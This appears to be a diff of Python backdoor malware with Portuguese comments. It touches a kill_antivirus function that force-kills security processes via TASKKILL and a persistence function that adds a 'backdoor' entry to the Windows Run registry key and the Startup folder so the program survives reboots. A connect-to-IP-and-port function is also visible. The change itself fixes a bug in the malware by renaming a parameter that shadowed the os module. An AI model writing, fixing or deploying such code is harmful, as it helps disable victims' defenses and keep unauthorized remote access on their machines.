@@ -118,8 +118,8 @@ def kill_antivirus():
                 subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
 
 # persistencia -> mesmo depois de reiniciar o virus continua rodando
-def persistencia(os):
-    if(os == 'nt'):
+def persistencia(sistema):
+    if(sistema == 'nt'):
         usuario = os.path.expanduser('~')
         diretorio = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
         caminho = usuario + diretorio
@@ -131,7 +131,7 @@ def persistencia(os):
             FNULL = open(os.devnull,'w')
             subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
 
-    elif(os == 'posix'):
+    elif(sistema == 'posix'):
         pass
 
 def conecta(IP, PORT):
